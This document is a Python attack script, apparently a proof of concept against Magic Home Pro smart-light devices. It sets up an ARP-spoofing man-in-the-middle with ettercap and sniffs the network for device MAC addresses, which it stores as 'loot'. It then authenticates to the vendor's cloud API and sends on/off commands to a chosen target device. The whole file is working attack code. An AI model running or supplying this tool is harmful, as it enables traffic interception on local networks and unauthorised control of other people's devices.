#!/usr/bin/env python3

import socket
import struct
import platform
import os
import sys
import requests
import json
from colorama import init
from colorama import Fore, Back, Style
import re
import time, subprocess

loot = []
global choice
choice = ''
global outtahere
outtahere = ""
q = "q"
global macAddress

def scan():
    with open('sniffedDevices.txt', 'a+') as f:
        os.system('clear')
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL )
        print (Fore.GREEN + "| Author: Victor Hanna (@9lyph)       |"+ Style.RESET_ALL )
        print (Fore.GREEN + "| Description: Magic Home Pro Sniffer |"+ Style.RESET_ALL )
        print (Fore.GREEN + "| (CTRL^C to Quit)                    |"+ Style.RESET_ALL )
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL )
        print (Fore.WHITE + '[+] Configuring IP Forwarding'+ Style.RESET_ALL )
        time.sleep(5)
        print (Fore.WHITE + '[+] Setting up MiTM'+ Style.RESET_ALL )
        time.sleep(2)
        ipForward = subprocess.Popen('sudo echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
        time.sleep(2)
        ettercap = subprocess.Popen('sudo ettercap -T -q -i eth0 -M arp /<!--Valid Gateway Address-->// > /dev/null &', shell=True)
        time.sleep(2)
        print (Fore.WHITE + '[+] Searching for Magic Home Device(s)'+ Style.RESET_ALL )
        itsthere = []
        while (True):
            conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
            try:
                raw_data, addr = conn.recvfrom(65535)
                dst_mac, src_mac, proto, data = ethernet_frame(raw_data)
                if 'FF:FF:FF:FF:FF:FF' in dst_mac: # Suppress Broadcast traffic
                    pass
                elif 'c8:2e:47'.upper() in src_mac:
                    if src_mac in loot:
                        pass
                    else:
                        print (Fore.WHITE + '[+] Device ' + src_mac + ' added to loot !'+ Style.RESET_ALL)
                        loot.append(src_mac)
                        f.write(src_mac + "\n")
                elif 'c8:2e:47'.upper() in dst_mac:
                    if dst_mac in loot:
                        pass
                    else:
                        print (Fore.WHITE + '[+] Device ' + dst_mac + ' added to loot !'+ Style.RESET_ALL)
                        loot.append(dst_mac)
                        f.write(dst_mac + "\n")
                else:
                    pass
            except KeyboardInterrupt:
                print (Fore.WHITE + "[+] Stopping MiTM"+ Style.RESET_ALL)
                time.sleep(2)
                subprocess.Popen.kill(ettercap)
                print (Fore.WHITE + '[+] Reconfiguring IP Forwarding'+ Style.RESET_ALL)
                time.sleep(2)
                os.system('sudo echo 0 > /proc/sys/net/ipv4/ip_forward')
                menu()

def turnOn(target, token):
    urlOn = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    array = {
        "dataCommandItems":[
            {"hexData":"71230fa3","macAddress":target}
        ]
    }

    data = json.dumps(array)

    headersOn = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOn, data=data, headers=headersOn)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Fore.WHITE + f"{target}" + Fore.GREEN + " Switched On" + Style.RESET_ALL)
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def turnOff(target, token):
    urlOff = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"

    array = {
        "dataCommandItems":[
            {"hexData":"71240fa4","macAddress":target}
        ]
    }

    data = json.dumps(array)
    headersOff = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json", 
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOff, data=data, headers=headersOff)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Fore.WHITE + f"{target}" + Fore.GREEN + " Switched Off" + Style.RESET_ALL)
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def lighItUp(target, token):
    outtahere = ""
    q = "q"
    if len(str(target)) < 12:
        print (Fore.RED + "[!] Invalid target" + Style.RESET_ALL)
    elif re.match('[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}$', target.lower()):
        print (outtahere.lower())
        while outtahere.lower() != q.lower():
            if outtahere == "0":
                turnOn(target, token)
            elif outtahere == "1":
                turnOff(target, token)
            outtahere = input(Fore.GREEN + "ON/OFF/QUIT ? (0/1/Q): " + Style.RESET_ALL)
        menu()

def attack():
    with open('sniffedDevices.txt', 'rb') as f:
        os.system('clear')
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Author: Victor Hanna (@9lyph)       |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Description: Magic Home Pro Sniffer |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Attack Device    : '1'              |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Exit to Main Menu: '2'              |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| (CTRL^C to Quit)                    |"+ Style.RESET_ALL)
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        print (Fore.WHITE + "[+] These are you available local targets:"+ Style.RESET_ALL)
        alreadyDone = []
        for target in f.readlines():
            macAddresses = ((target).replace(b":", b""))
            if macAddresses in alreadyDone:
                continue
            else:
                alreadyDone.append(macAddresses)
                print (target.replace(b":", b"").decode('utf-8').strip())

        choice = int(input ("Choice: "))
        if (choice == 1):
            macAddress = input("[+] Enter Device MAC (xxxxxxxxxxxx): ")
            urlAuth = "https://wifij01us.magichue.net/app/login/ZG001"

            data = {
                "userID":"<!--Valid User Name-->",
                "password":"<!--Valid Password-->",
                "clientID":""
            }

            headersAuth = {
                "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
                "Accept-Language": "en-US",
                "Accept": "application/json", 
                "Content-Type": "application/json; charset=utf-8",
                "Host": "wifij01us.magichue.net",
                "Connection": "close",
                "Accept-Encoding": "gzip, deflate"
            }
            print (Fore.WHITE + "[+] Authenticating ...")
            response = requests.post(urlAuth, json=data, headers=headersAuth)
            resJsonAuth = response.json()
            token = (resJsonAuth['token'])
            lighItUp(macAddress, token)
        elif (choice == 2):
            menu()
        else:
            attack()

def ethernet_frame(data):
    dst_mac, src_mac, proto = struct.unpack('!6s6sH', data[:14])
    return get_mac_addr(dst_mac), get_mac_addr(src_mac), socket.htons(proto), data[14:]

def get_mac_addr(bytes_addr):
    bytes_str = map('{:02x}'.format, bytes_addr)
    return ':'.join(bytes_str).upper()

def menu():
    os.system('clear')
    while (True):

        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Author: Victor Hanna (@9lyph)       |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Description: Magic Home Pro Sniffer |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Scan   : '1'                        |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| Attack : '2'                        |"+ Style.RESET_ALL)
        print (Fore.GREEN + "| (CTRL^C to Quit)                    |"+ Style.RESET_ALL)
        print (Fore.GREEN + "+=====================================+"+ Style.RESET_ALL)
        try:
            choice = (input ("Choice: "))
            if (int(choice) == 1):
                scan()
            elif (int(choice) == 2):
                attack()
        except KeyboardInterrupt:
            os.system ('sudo echo 0 > /proc/sys/net/ipv4/ip_forward')
            print("\nBye bye !\n")
            sys.exit()

if __name__ == '__main__':
    menu()
